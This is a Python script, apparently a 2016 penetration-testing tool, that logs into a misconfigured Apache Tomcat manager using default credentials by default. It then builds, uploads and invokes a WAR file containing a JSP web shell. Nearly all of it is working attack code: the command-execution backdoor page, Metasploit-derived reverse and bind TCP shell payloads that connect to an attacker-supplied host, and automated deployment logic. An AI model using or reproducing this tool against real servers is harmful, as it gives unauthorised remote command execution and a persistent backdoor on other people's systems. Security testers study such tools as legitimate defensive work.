#!/usr/bin/python

#
# Apache Tomcat server misconfiguration penetration testing tool.
#   What this tool does is to locate Tomcat server, validate access
#   to it's manager application (web) and then leverage this access
#   in order to upload there an automatically generated WAR application.
#   After having the application uploaded and deployed, script invokes it
#   and then if configured so - handles incoming shell connection (reverse tcp)
#   or connects back to binded connection.
#
# In other words - automatic Tomcat WAR deployment pwning tool.
#
# NOTICE:
#   Shell providing functionality (bind&reverse) comes from the Rapid7 Metasploit-Framework, 
#   which in turn was based on the code coming from: http://www.security.org.sg/code/jspreverse.html.
#   In order to refer to the original source, please look at the Metasploit core lib.
#   On Linux instances the file can be found at:
#       /usr/share/metasploit-framework/lib/msf/core/payload/jsp.rb
#
# Currently tested on:
#  Apache Tomcat/7.0.52 (Ubuntu)
#
# Mariusz B. / MGeeky, '16
#

import mechanize
import os
import urllib
import time
import urllib2
import sys
import random
import string
import optparse
import tempfile
import shutil
import re
import base64
import logging
import commands
from BeautifulSoup import BeautifulSoup

logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
logging.addLevelName( logging.DEBUG, "\033[1;32m%s\033[1;0m" % logging.getLevelName(logging.DEBUG))
logging.addLevelName( logging.WARNING, "\033[1;35m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelName(logging.ERROR))
logger = logging.getLogger()


def establishReverseTcpListener(opts):
    logger.debug('Establishing listener for incoming reverse TCP shell...')

def connectToBindShell(hostn, opts):
    host = hostn[:hostn.find(':')]
    logger.debug('Shell has binded to port %s at remote host. Connecting back to it...' % opts.port)
    

def generateWAR(code, title, appname):
    dirpath = tempfile.mkdtemp()

    logger.debug('Generating temporary structure for %s WAR at: "%s"' % (appname, dirpath))

    os.makedirs(dirpath + '/files/META-INF')
    os.makedirs(dirpath + '/files/WEB-INF')
    
    with open(dirpath + '/index.jsp', 'w') as f:
        f.write(code)

    javaver = commands.getstatusoutput('java -version')[1]
    m = re.search('version "([^"]+)"', javaver)
    if m:
        javaver = m.group(1)
        logger.debug('Working with Java at version: %s' % javaver)
    else:
        logger.debug('Could not retrieve Java version. Assuming: "1.8.0_60"')
        javaver = '1.8.0_60'

    with open(dirpath + '/files/META-INF/MANIFEST.MF', 'w') as f:
        f.write('''Manifest-Version: 1.0
Created-By: %s (Sun Microsystems Inc.)

''' % javaver)

    logger.debug('Generating web.xml with servlet-name: "%s"' % title)
    with open(dirpath + '/files/WEB-INF/web.xml', 'w') as f:
        f.write('''<?xml version="1.0" encoding="ISO-8859-1"?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
    version="2.4">

    <display-name>%s</display-name>

    <servlet>
        <servlet-name>%s</servlet-name>
    </servlet>

    <servlet-mapping>
        <servlet-name>%s</servlet-name>
        <url-pattern>/%s</url-pattern>
    </servlet-mapping>

</web-app>
''' % (title, appname.capitalize(), appname.capitalize(), appname))

    cwd = os.getcwd()
    os.chdir(dirpath)
    outpath = tempfile.gettempdir() + '/' + appname + '.war'
    logger.debug('Generating WAR file at: "%s"' % outpath)
    packing = commands.getstatusoutput('jar -cvf %s *' % outpath)
    os.chdir(cwd)

    logger.debug(packing[1])

    tree = commands.getstatusoutput('tree %s' % dirpath)[1]
    if not ('sh' in tree and 'tree: not found' in tree):
        logger.debug('WAR file structure:')
        logger.debug(tree)

    return (dirpath, outpath)

def chooseShellFunctionality(opts):
    host = opts.host
    port = opts.port

    if host and port:
        # Reverse TCP
        return 1
    elif port and not host:
        # Bind shell
        return 2
    else:
        return 0


def prepareTcpShellCode(opts):
    host = opts.host
    port = opts.port

    socketInvocation = ''
    mode = chooseShellFunctionality(opts)
    if mode == 1:
        # Reverse TCP
        socketInvocation = ''' 
        /* Reverse shell */
        Socket socket = new Socket( "%(host)s", %(port)s );
        Process process = Runtime.getRuntime().exec( ShellPath );
        ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
        ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
        ''' % {'host' : host, 'port': port }
        logger.debug('Preparing additional code for Reverse TCP shell')
    elif mode == 2:
        # Bind shell
        socketInvocation = ''' 
        /* Bind shell */
        ServerSocket server_socket = new ServerSocket( %(port)s );
        Socket client_socket = server_socket.accept();
        server_socket.close();
        Process process = Runtime.getRuntime().exec( ShellPath );
        ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
        ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
        ''' % {'port': port }
        logger.debug('Preparing additional code for bind TCP shell')
    else:
        logger.debug('No additional code for shell functionality requested.')
        return ''

    #
    # NOTICE:
    #   The below code comes from the Rapid7 Metasploit-Framework, which in turn was based
    #   on the code coming from: http://www.security.org.sg/code/jspreverse.html.
    #   In order to refer to the original source, please look at the Metasploit core lib.
    #   On Linux instances the file can be found at:
    #       /usr/share/metasploit-framework/lib/msf/core/payload/jsp.rb
    #
    #
    payload = '''
    <%%
      class StreamConnector extends Thread {
        InputStream ins;
        OutputStream outs;

        StreamConnector( InputStream ins, OutputStream outs ) {
          this.ins = ins;
          this.outs = outs;
        }

        public void run() {
          BufferedReader bufin  = null;
          BufferedWriter bufout = null;
          try {
            bufin  = new BufferedReader( new InputStreamReader( this.ins ) );
            bufout = new BufferedWriter( new OutputStreamWriter( this.outs ) );
            char buffer[] = new char[8192];
            int length;
            while( ( length = bufin.read( buffer, 0, buffer.length ) ) > 0 ) {
              bufout.write( buffer, 0, length );
              bufout.flush();
            }
          } catch( Exception e ){}
          try {
            if( bufin != null )
              bufin.close();
            if( bufout != null )
              bufout.close();
          } catch( Exception e ){}
        }
      }

      try {
        String ShellPath;
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            ShellPath = new String("/bin/sh");
        } else {
            ShellPath = new String("cmd.exe");
        }
        %(socketInvocation)s
      } catch( Exception e ) {}
    %%>''' % {'socketInvocation': socketInvocation}

    return payload


def preparePayload(opts):
    logger.debug('Generating JSP WAR backdoor code...')

    shellFunc = ''

    if chooseShellFunctionality(opts) > 0:
        shellFunc = '''
    <%%
        if( request.getHeader("X-Pass") != null && request.getHeader("X-Pass").equals("%(password)s")) {
    %%>
            %(shell)s
    <%%
        }
    %%>
    ''' % {'password' : opts.shellpass, 'shell': prepareTcpShellCode(opts)}


    payload = '''<%%@page import="java.lang.*"%%>
<%%@page import="java.util.*"%%>
<%%@page import="java.io.*"%%>
<%%@page import="java.net.*"%%>
<%%!
    public String execute(String pass, String cmd) {
        final String hardcodedPass = "%(password)s";
        StringBuilder res = new StringBuilder();

        if (cmd != null && cmd.length() > 0 && (pass.equals(hardcodedPass) || hardcodedPass.toLowerCase().equals("none"))){
            try {
                Process proc = Runtime.getRuntime().exec(cmd);
                OutputStream outs = proc.getOutputStream();
                InputStream ins = proc.getInputStream();
                DataInputStream datains = new DataInputStream(ins);
                String datainsline = datains.readLine();

                while ( datainsline != null) {
                    res.append(datainsline + "<br/>");
                    datainsline = datains.readLine();
                }
            } catch( IOException e) {
                return "IOException: " + e.getMessage();
            }
        }
        else {
            return "Wrong password or no command issued.";
        }

        return res.toString();
    }
%%><!DOCTYPE html>
<html>
    <head>
        <title>JSP Application</title>
    </head>
    <body>
        <h3>JSP Backdoor deployed as WAR on Apache Tomcat.</h3>
        <i style="font-size:9px">You need to provide valid password in order to leverage RCE.</i>
        <br/>
        <font style="font-size:5px" style="font-style:italic;color:grey">coded by <a href="https://github.com/mgeeky">mgeeky</a></font>
        <br/>
        <hr/>
        <form method=post>
        <table style="width:100%%">
            <tr>
                <td>Password:</td><td style="width:100%%"><input type=password width=40 name="password" value='<%% out.print((request.getParameter("password") != null) ? request.getParameter("password") : ""); %%>' /></td>
            </tr>
            <tr>
                <td>tomcat $ </td><td style="width:100%%"><input type=text size=100 name="cmd" value='<%% out.print((request.getParameter("cmd") != null) ? request.getParameter("cmd") : "uname -a"); %%>' onClick="this.select();" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }" /></td>
            </tr>
            <tr>
                <td><input type=submit style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1"/></td><td></td>
            </tr>
        </table>
        </form>
        <hr />
        <pre style="background-color:black;color:lightgreen;padding: 5px 25px 25px 25px;"><%%
            if (request.getParameter("cmd") != null && request.getParameter("password") != null) {
                out.println("<br/>tomcat $ " + request.getParameter("cmd") + "<br/>");
                out.println(execute(request.getParameter("password"), request.getParameter("cmd")));
            }
        %%></pre>
    %(shellPayload)s
    </body>
</html>''' % {'title': opts.title, 'password': opts.shellpass, 'shellPayload': shellFunc }

    return payload

def invokeApplication(browser, url, opts):
    appurl = 'http://%s/%s/' % (url, opts.appname)
    logger.debug('Invoking application at url: "%s"' % appurl)

    try:
        mode = chooseShellFunctionality(opts)
        if opts.shellpass and mode > 0:
            logger.debug("Adding 'X-Pass: %s' header for shell functionality authentication." % opts.shellpass)
            browser.addheaders.append(('X-Pass', opts.shellpass))

        if mode == 1 and opts.noconnect:
            logger.warning("Set up your incoming shell listener, I'm giving you 3 seconds.")
            time.sleep(3)
        elif mode == 0 and opts.noconnect:
            logger.warning("Connect back to your shell at: %s:%s" % (url[:url.find(':')], opts.port))
        elif mode == 2 and opts.noconnect:
            logger.warning("Shell has been binded. Go and connect back to it!")
        resp = browser.open(appurl)
        return True

    except urllib2.HTTPError, e:
        if e.code == 404:
            logger.error('Application "%s" does not exist, or was not deployed.' % opts.appname)
        else:
            logger.error('Failed with error: %d, msg: "%s"' % (int(e.code), str(e)))

    return False

def deployApplication(browser, url, appname, warpath):
    logger.debug('Deploying application: %s from file: "%s"' % (appname, warpath))
    resp = browser.open(url)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)
        if url in action and '/upload?' in action:
            browser.form = form
            browser.form.add_file(open(warpath, 'rb'), 'application/octet-stream', appname+'.war')
            browser.submit()

            checkIsDeployed(browser, url, appname)
            return True

    return False

def removeApplication(browser, url, appname):
    browser.open(url)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)
        if url in action and '/undeploy?path=/'+appname in action:
            browser.form = form
            browser.submit()
            return True

    return False

def checkIsDeployed(browser, url, appname):
    browser.open(url)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)
        if url in action and '/undeploy?path=/'+appname in action:
            return True

    return False

def unloadApplication(browser, url, appname):
    appurl = 'http://%s/%s/' % (url, appname)
    logger.debug('Unloading application: "%s"' % appurl)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)
        if url in action and '/undeploy?path=/'+appname in action:
            browser.form = form
            resp = browser.submit()
            content = resp.read()

            try:
                resp = browser.open(appurl)
            except urllib2.HTTPError, e:
                if e.code == 404:
                    return True

    return False

def validateManagerApplication(browser):
    found = 0
    actions = ('stop', 'start', 'deploy', 'undeploy', 'upload', 'expire', 'reload')
    for form in browser.forms():
        for a in actions:
            action = urllib.unquote_plus(form.action)
            if '/'+a+'?' in action:
                found += 1

    return (found >= len(actions))

def browseToManager(url, user, password):
    logger.debug('Browsing to "%s"... Creds: %s:%s' % (url, user, password))
    browser = mechanize.Browser()
    cookiejar = mechanize.LWPCookieJar()
    browser.set_cookiejar(cookiejar)
    browser.set_handle_robots(False)
    browser.add_password(url, user, password)

    error = None
    retry = False
    page = None
    try:
        page = browser.open(url)
    except urllib2.URLError, e:
        error = str(e)
        try:
            logger.debug('Failed with /manager/ trying with /manager/html')
            page = browser.open(url + 'html')
            logger.debug('Succeeded, most likely dealing with Tomcat6.')
            error = None
            url += 'html'
        except urllib2.URLError, e:
            if '403' in str(e):
                logger.debug('Got 403, most likely dealing with Tomcat6.')
                logger.error('Invalid credentials supplied for Apache Tomcat.')
                pass
            else:
                error = str(e)

    if error != None:
        if 'Connection refused' in error:
            logger.error('Could not connect with "%s", connection refused.' % url)
        elif 'Error 401' in error:
            logger.error('Invalid credentials supplied for Apache Tomcat.')
        else:
            logger.error('Browsing to the server (%s) failed: \n\t%s' % (url, e))

        return None, None

    src = page.read()

    if validateManagerApplication(browser):
        logger.debug('Apache Tomcat Manager Application reached & validated.')
    else:
        logger.error('Specified URL does not point at the Apache Tomcat Manager Application')
        return None, None

    return browser, url

def generateRandomPassword(N=12):
    return ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(N))

def options():
    print '''
    Apache Tomcat 6/7 auto WAR deployment & launching tool
    Mariusz B. / MGeeky '16

Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
    ''' 

    usage = '%prog [options] server\n\n  server\t\tSpecifies server address. Please also include port after colon.'
    parser = optparse.OptionParser(usage=usage)

    general = optparse.OptionGroup(parser, 'General options')
    general.add_option('-v', '--verbose', dest='verbose', help='Verbose mode.', action='store_true')
    general.add_option('-s', '--simulate', dest='simulate', help='Simulate breach only, do not perform any offensive actions.', action='store_true')
    general.add_option('-G', '--generate', metavar='OUTFILE', dest='generate', help='Generate JSP backdoor only and put it into specified outfile path then exit. Do not perform any connections, scannings, deployment and so on.')
    general.add_option('-U', '--user', metavar='USER', dest='user', default='tomcat', help='Tomcat Manager Web Application HTTP Auth username. Default="tomcat"')
    general.add_option('-P', '--pass', metavar='PASS', dest='password', default='tomcat', help='Tomcat Manager Web Application HTTP Auth password. Default="tomcat"')
    parser.add_option_group(general)

    conn = optparse.OptionGroup(parser, 'Connection options')
    conn.add_option('-H', '--host', metavar='RHOST', dest='host', help='Remote host for reverse tcp payload connection. When specified, RPORT must be specified too. Otherwise, bind tcp payload will be deployed listening on 0.0.0.0')
    conn.add_option('-p', '--port', metavar='PORT', dest='port', help='Remote port for the reverse tcp payload when used with RHOST or Local port if no RHOST specified thus acting as a Bind shell endpoint.')
    conn.add_option('-u', '--url', metavar='URL', dest='url', default='/manager/', help='Apache Tomcat management console URL. Default: /manager/')
    parser.add_option_group(conn)

    payload = optparse.OptionGroup(parser, 'Payload options')
    payload.add_option('-R', '--remove', metavar='APPNAME', dest='remove_appname', help='Remove deployed app with specified name. Can be used for post-assessment cleaning')
    payload.add_option('-X', '--shellpass', metavar='PASSWORD', dest='shellpass', help='Specifies authentication password for uploaded shell, to prevent unauthenticated usage. Default: randomly generated. Specify "None" to leave the shell unauthenticated.', default=generateRandomPassword())
    payload.add_option('-t', '--title', metavar='TITLE', dest='title', help='Specifies head>title for uploaded JSP WAR payload. Default: "JSP Application"', default='JSP Application')
    payload.add_option('-n', '--name', metavar='APPNAME', dest='appname', help='Specifies JSP application name. Default: "jsp_app"', default='jsp_app')
    payload.add_option('-x', '--unload', dest='unload', help='Unload existing JSP Application with the same name. Default: no.', action='store_true')
    payload.add_option('-C', '--noconnect', dest='noconnect', help='Do not connect to the spawned shell immediately. By default this program will connect to the spawned shell, specifying this option let\'s you use other handlers like Metasploit, NetCat and so on.', action='store_true')
    payload.add_option('-f', '--file', metavar='WARFILE', dest='file', help='Custom WAR file to deploy. By default the script will generate own WAR file on-the-fly.')
    parser.add_option_group(payload)

    opts, args = parser.parse_args()

    if opts.port:
        try:
            port = int(opts.port)
            if port < 0 or port > 65535:
                raise ValueError
        except ValueError:
            logger.error('RPORT must be an integer in range 0-65535')
            sys.exit(0)

    if (opts.host and not opts.port):
        logger.error('Both RHOST and RPORT must be specified to deploy reverse tcp payload.')
        sys.exit(0)
    elif (opts.port and not opts.host):
        logger.info('Bind shell will be deployed on: %s:%s' % (args[0][:args[0].find(':')], opts.port))
    elif (opts.host and opts.port):
        logger.info('Reverse shell will connect to: %s:%s.' % (opts.host, opts.port))

    if opts.remove_appname and (opts.host or opts.port or opts.file):
        logging.warning('Removing previously deployed package, any further actions will not be undertaken.')

    if opts.generate:
        if opts.file:
            logging.error('Custom JSP WAR file has been specified. Mutually exclusive with generate-only function.')
            sys.exit(0)

        logging.warning('Will generate JSP backdoor and store it into specified output path only.')

    if opts.file and not os.path.exists(file):
        logger.error('Specified WAR file does not exists in local filesystem.')
        sys.exit(0)
        
    if opts.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)
        
    return (opts, args)


def main():
    (opts, args) = options()

    if len(args) < 1:
        logging.error('One shall not go any further without an url!')
        return

    if not opts.generate:
        url = 'http://%s%s' % (args[0], opts.url)
        browser, url = browseToManager(url, opts.user, opts.password)
        if browser == None:
            return

    try:
        appname = opts.appname
        if not opts.remove_appname:
            mode = chooseShellFunctionality(opts)
            if not opts.file and not opts.simulate:
                code = preparePayload(opts)
                (dirpath, warpath) = generateWAR(code, opts.title, opts.appname)

                if opts.generate:
                    os.rename(warpath, opts.generate)
                    logger.debug('Removing temporary WAR directory: "%s"' % dirpath)
                    shutil.rmtree(dirpath)
                    logging.info('JSP WAR backdoor has been generated and stored at: "%s"' % opts.generate)
                    return

            else:
                if opts.simulate:
                    logger.info('[Simulation mode] No JSP backdoor generation.')
                warpath = opts.file
        else:
            appname = opts.remove_appname

        if checkIsDeployed(browser, url, appname):
            if opts.remove_appname:
                logging.info("Removing previously deployed WAR application with name: '%s'" % opts.remove_appname)
                if not opts.simulate:
                    if removeApplication(browser, url, opts.remove_appname):
                        logging.info('Succeeded. Hasta la vista!')
                    else:
                        logging.error("Removal failed miserably!")
                else:
                    logger.info('[Simulation mode] No actual JSP removing.')
                return

            logger.warning('Application with name: "%s" is already deployed.' % opts.appname)
            if opts.unload and not opts.simulate:
                logger.debug('Unloading existing one...')
                if unloadApplication(browser, args[0], opts.appname):
                    logger.debug('Succeeded.')
                else:
                    logger.debug('Unloading failed.')
                    return
            elif opts.simulate:
                logger.info('[Simulation mode] No actual application unloading.')
            else:
                logger.warning('Not continuing until the application name is changed or current one unloaded.')
                logger.warning('Please use -x (--unload) option to force existing application unloading.')
                return
        else:
            logger.info('It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)

            if opts.remove_appname:
                return 

        if opts.simulate:
            logger.info('[Simulate mode] Then it goes for JSP backdoor deployment and the game is over.')
            return

        deployed = deployApplication(browser, url, opts.appname, warpath)

        if not opts.file and dirpath:
            logger.debug('Removing temporary WAR directory: "%s"' % dirpath)
            shutil.rmtree(dirpath)

        if deployed:
            logger.debug('Succeeded, invoking it...')

            if mode == 1 and not opts.noconnect:
                # if Reverse TCP - firstly establish listener, then invoke application.
                establishReverseTcpListener(opts)

            if invokeApplication(browser, args[0], opts):
                logger.info("\033[0;32mJSP Backdoor up & running on http://%s/%s/\033[1;0m" % (args[0], opts.appname))
                logger.info("\033[0;33mHappy pwning, here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)

                if mode == 2 and not opts.noconnect:
                    # If Bind TCP - firstly invoke application, then connect back to it.
                    connectToBindShell(args[0], opts)

                if mode == 0:
                    logger.debug('No shell functionality was included in backdoor.')
            else:
                logger.error("\033[1;41mNo pwning today, backdoor was not deployed.\033[1;0m")


        else:
            logger.error('Failed.')

    except KeyboardInterrupt:
        print '\nUser interruption.'


if __name__ == '__main__':
    main()
    print

